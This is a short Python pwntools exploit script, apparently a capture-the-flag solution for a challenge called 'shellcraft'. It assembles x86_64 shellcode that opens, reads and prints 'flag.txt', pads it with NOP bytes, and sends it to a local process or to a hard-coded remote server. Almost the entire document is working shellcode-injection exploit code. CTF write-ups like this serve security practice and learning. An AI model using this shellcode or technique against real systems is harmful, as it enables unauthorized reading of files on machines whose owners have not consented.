#!/usr/bin/python
# by https://kileak.github.io/
from pwn import *
import sys

LOCAL = False

HOST = "20.216.39.14"
PORT = 1236
PROCESS = "./shellcraft"

context.arch="x86_64"

def exploit(r):
  # openat, read, write
	SC = """
	xor rax, rax
	mov ax, 0x101
	xor rdi, rdi
	mov rdi, 0x00000000ffffff9c
	mov rsi, rsp
	add rsi, 0x108
	xor rdx, rdx
	xor r10, r10
	syscall

	xchg rdi, rax
	xor rax, rax
	mov rsi, rsp
	mov rdx, 0x40
	syscall

	xor rax, rax
	mov al, 1
	mov rdi, 1
	syscall
	"""

	payload = asm(SC)

	payload = payload.ljust(0x100, b"\x90")
	payload += b"flag.txt\x00"

	r.sendline(payload)

	r.interactive()
	
	return

if __name__ == "__main__":
	# e = ELF("./shellcraft")

	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)		
	else:
		LOCAL = True
		r = process("./shellcraft")
		print (util.proc.pidof(r))
		pause()
	
	exploit(r)
